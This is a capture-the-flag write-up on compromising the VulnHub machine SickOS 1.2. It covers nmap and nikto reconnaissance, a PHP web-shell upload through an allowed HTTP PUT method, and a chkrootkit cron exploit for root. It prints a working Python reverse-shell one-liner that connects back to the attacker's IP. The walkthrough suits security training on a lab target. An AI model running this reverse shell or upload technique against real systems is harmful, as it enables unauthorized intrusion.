![](IMAGES/0.png)

# GETTING STARTED

To download **sickos 1.2**, click on the link given below:

https://www.vulnhub.com/entry/sickos-12,144/

> [!NOTE] 
> This writeup documents the steps that successfully led to pwnage of the machine. It does not include the dead-end steps encountered during the process (which were numerous). This is just my take on pwning the machine and you are welcome to choose a different path.

# RECONNAISSANCE

I began the hack by scanning my network to find the target IP using **nmap**.

```bash

┌──(root㉿kali)-[~/ctf/sickos2]
└─# nmap -sn 192.168.1.0/24                                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 00:26 EDT
Nmap scan report for RTK_GW (192.168.1.1)
Host is up (0.0015s latency).
MAC Address: F8:C4:F3:D0:63:13 (Shanghai Infinity Wireless Technologies)
Nmap scan report for ubuntu (192.168.1.4)
Host is up (0.00037s latency).
MAC Address: 00:0C:29:05:85:91 (VMware)
Nmap scan report for kali (192.168.1.13)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.53 seconds
```

I then scanned the ports of the target (*192.168.1.4*).

![](IMAGES/1.png)

# FOOTHOLD

Since the target had port 80 open, I accessed it on the web and also viewed its source for anything interesting.

![](IMAGES/2.png)

![](IMAGES/3.png)

However, I found nothing of use. So I fuzzed for interesting directories and files using **dirb**.

![](IMAGES/4.png)

I then visited the */test/* directory.

![](IMAGES/5.png)

I then performed a **nikto** scan on this path to see if I could find anything juicy.

![](IMAGES/6.png)

Here, I found out that the server allowed the **PUT** method, which meant I could upload a PHP file for a reverse shell. I validated this using **curl**.

![](IMAGES/7.png)

Now that this was confirmed, I uploaded a **PHP** code to get remote code execution.

I referred to this article:- https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

![](IMAGES/8.png)

Hence, I achieved command execution. I then used this to obtain a reverse shell. The payload I used is:

```python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.13",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![](IMAGES/9.png)

![](IMAGES/10.png)

Hence I got initial access on the system.

![](IMAGES/11.png)

# PRIVILEGE ESCALATION

I downloaded the [**linux smart enumeration**](https://github.com/diego-treitos/linux-smart-enumeration) script to assist with privilege escalation.

![](IMAGES/12.png)

![](IMAGES/13.png)

Here, I discovered that we could modify the cron job.

![](IMAGES/14.png)

![](IMAGES/15.png)

I then used **searchsploit** to examine available exploits for all programs and found one for **chkrootkit**.

![](IMAGES/16.png)

I checked the version of this script to determine if the available exploits would be applicable.

![](IMAGES/17.png)

I then downloaded the text file from **Searchsploit** and reviewed it to understand how I could escalate my privileges.

![](IMAGES/18.png)

![](IMAGES/19.png)

Hence, I followed these steps to gain root access.

![](IMAGES/20.png)

![](IMAGES/21.png)

I then waited for a few minutes and switched the user to root.

![](IMAGES/22.png)

I then captured the final flag.

![](IMAGES/23.png)

# CLOSURE

Here's a brief summary of how I captured the root flag:
- I uploaded a PHP file for remote command injection in the _/test/_ folder.
- I used this remote code execution (RCE) to obtain a reverse shell.
- I then inspected the `cron.daily` folder and exploited the **chkrootkit** vulnerability to gain root access.
- Finally, I captured the flag from the _/root_ directory.

![](IMAGES/x.png)

That's it from my side. Until next time:)

---